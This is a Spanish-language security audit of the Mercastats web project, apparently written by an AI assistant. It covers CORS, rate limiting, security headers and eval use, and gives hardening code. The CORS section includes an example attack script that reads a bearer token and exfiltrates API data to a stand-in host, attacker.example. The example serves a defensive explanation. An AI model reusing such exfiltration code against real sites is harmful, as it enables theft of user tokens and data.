# Auditoría de Seguridad - Mercastats

Última actualización: 2025-12-04

Este documento resume los hallazgos de una revisión rápida de seguridad del proyecto Mercastats, describe por qué ciertas áreas son seguras o problemáticas, y propone mitigaciones concretas (con ejemplos de código donde procede).

**Resumen rápido**

- SQL Injection: protegido (uso de SQLx y queries parametrizadas).
- Hashing de contraseñas: correcto (bcrypt con coste 12).
- JWT: correcto (firma y verificación, expiración presente).
- Validación de input: presente (validator en payloads importantes).
- CORS: actualmente permissive → riesgo alto (ver sección dedicada).
- Rate limiting: no implementado → riesgo medio (fuerza bruta / DoS).
- Security headers: ausentes → mejorar.
- Uso de `eval` en frontend: localizado y con riesgo bajo hoy, recomendable refactorizar.

**1. SQL Injection**

Estado: SEGURO

Motivo: Todas las consultas que revisadas usan `sqlx::query!`, `sqlx::query_as!` o binding (`$1`, `$2`) con valores pasados mediante `.bind()` o argumentos del macro `query!`.

Ejemplo de por qué es seguro:

```sql
-- La librería prepara la query con placeholders y envía los valores por separado
SELECT * FROM usuarios WHERE email = $1

-- $1 se trata como dato literal incluso si contiene caracteres especiales
```

Recomendación: Mantener la práctica. Evitar construir SQL con concatenación de strings o interpolación.

---

**2. Autenticación y hashing**

Estado: ADECUADO

- Se usa `bcrypt` (cost 12) para hashear contraseñas.
- JWT se firma y valida con `jsonwebtoken` y expiración de 24h.

Recomendaciones:

- Considerar permitir configuración del coste de bcrypt vía env var para poder aumentarlo en el futuro.
- Implementar refresh tokens si quieres sesiones de larga duración seguras.

---

**3. CORS permisivo (Riesgo ALTO)**

Archivo afectado: `backend/src/main.rs`

Descripción: Actualmente la aplicación usa `CorsLayer::permissive()` lo que permite orígenes arbitrarios. En producción esto facilita CSRF y robo de datos si un token de autenticación (por ejemplo almacenado en `localStorage`) es accesible desde un sitio malicioso.

Ejemplo de ataque (CSRF / exfiltración):

```javascript
// Código ejecutado en sitio-malicioso.com
fetch("http://tu-backend:8000/api/tickets/history", {
  method: "GET",
  headers: { Authorization: "Bearer " + localStorage.getItem("token") },
})
  .then((r) => r.json())
  .then((data) =>
    fetch("https://attacker.example/exfil", {
      method: "POST",
      body: JSON.stringify(data),
    })
  );
```

Mitigación recomendada (ejemplo): restringir orígenes desde configuración y permitir sólo los métodos/headers necesarios.

Ejemplo (Rust/tower-http):

```rust
use tower_http::cors::{CorsLayer};
use axum::http::Method;

let cors = CorsLayer::new()
    .allow_origin(config.cors_origins.iter().map(|o| o.parse().unwrap()).collect::<Vec<_>>())
    .allow_methods([Method::GET, Method::POST, Method::PUT, Method::DELETE])
    .allow_headers([axum::http::header::AUTHORIZATION, axum::http::header::CONTENT_TYPE])
    .allow_credentials(true);

let app = Router::new().layer(cors);
```

Donde `config.cors_origins` proviene de `.env` (p.ej. `CORS_ORIGINS=https://miapp.com`).

---

**4. Rate limiting (Riesgo MEDIO)**

Estado: No implementado (aunque hay variables en `.env.example`). Sin rate limiting un atacante puede realizar fuerza bruta en `/api/auth/login` o saturar endpoints.

Recomendación: añadir un middleware de rate limiting por IP y/o por usuario para endpoints sensibles (login, ingest). Ejemplo de crate: `tower-governor` o `tower::limit`.

Ejemplo mínimo (conceptual):

```rust
// Usando tower-governor (ejemplo conceptual)
use tower_governor::{GovernorConfigBuilder, GovernorLayer};

let cfg = GovernorConfigBuilder::default()
    .per_second(2)
    .burst_size(5)
    .finish()
    .unwrap();

let app = Router::new().layer(GovernorLayer::new(&cfg));
```

---

**5. Security headers (Riesgo MEDIO)**

Observación: No se añaden cabeceras HTTP como `X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy` o `Strict-Transport-Security`.

Recomendación: añadir middleware que inyecte estas cabeceras en cada respuesta.

Ejemplo (Axum middleware):

```rust
use axum::middleware;
use axum::http::header;

async fn security_headers<B>(req: axum::http::Request<B>, next: axum::middleware::Next<B>) -> axum::http::Response<B> {
    let mut response = next.run(req).await;
    let headers = response.headers_mut();
    headers.insert("x-frame-options", "DENY".parse().unwrap());
    headers.insert("x-content-type-options", "nosniff".parse().unwrap());
    headers.insert("strict-transport-security", "max-age=31536000; includeSubDomains".parse().unwrap());
    headers.insert("content-security-policy", "default-src 'self'; script-src 'self'".parse().unwrap());
    response
}
```

---

**6. Uso de `eval` en frontend (Riesgo BAJO hoy, mejorar)**

Archivo observado: `frontend/src/components/chart.rs`

Se utiliza `js_sys::eval()` para crear funciones formateadoras de tooltip/labels. Actualmente el contenido evaluado está construido con valores numéricos derivados del código, no de entrada de usuario, por lo que el riesgo inmediato de XSS es bajo. Sin embargo, el uso de `eval` es una mala práctica y puede introducir vectores de XSS si más tarde se incluyen datos externos.

Recomendación: eliminar `eval` y generar las funciones de formato desde código JS seguro exportado a WASM (wasm-bindgen) o usar `js_sys::Function::new_with_args` con parámetros controlados.

Ejemplo sugerido:

```rust
// Exportar helper JS con wasm_bindgen y llamar desde Rust pasando threshold
#[wasm_bindgen(module = "/src/js/formatters.js")]
extern "C" {
    fn createFormatter(threshold: f64) -> js_sys::Function;
}
```

---

**7. Manejo de archivos / validaciones**

Observaciones positivas:

- Se valida extensión y tamaño del PDF en `TicketPdfInsert::validate()`.
- El backend valida MIME recibido y rechaza tipos no permitidos.

Recomendaciones adicionales:

- En el worker de OCR (Python) validar tamaños máximos y tipos antes de procesar.
- Limitar la persistencia de datos en los logs (no loguear contenido completo de tickets en producción).

---

**8. Seguridad del servicio de inteligencia (Python)**

Observaciones:

- El servicio FastAPI tiene CORS configurado con `allow_origins=["*"]` según los archivos leídos: esto replica el problema del backend. Debe restringirse.

Recomendaciones:

- Igual que para Rust: restringir `allow_origins` en producción.
- Evitar ejecutar shell/`os.system`/`eval` en el código del worker (no se han detectado usos peligrosos, pero revisar con análisis estático).

---

**Acciones recomendadas priorizadas**

1. (Alta) Reemplazar `CorsLayer::permissive()` por una configuración de CORS basada en `CORS_ORIGINS` de entorno.
2. (Alta) Implementar rate limiting (especialmente en `/api/auth/login`).
3. (Media) Añadir middleware que inyecte cabeceras de seguridad HTTP.
4. (Media) Refactorizar `eval` en frontend para evitar código evaluado dinámicamente.
5. (Baja) Revisar logs para evitar fuga de datos sensibles.

---

Si quieres, puedo:

- Implementar el cambio de CORS en `backend/src/main.rs` y añadir `CORS_ORIGINS` en `config.rs`.
- Añadir un middleware de rate limiting y el ejemplo de configuración para login.
- Refactorizar el uso de `eval` en `frontend/src/components/chart.rs` y proponer un helper JS para formato seguro.

Indícame cuál de estas acciones quieres que aplique primero y la implemento.
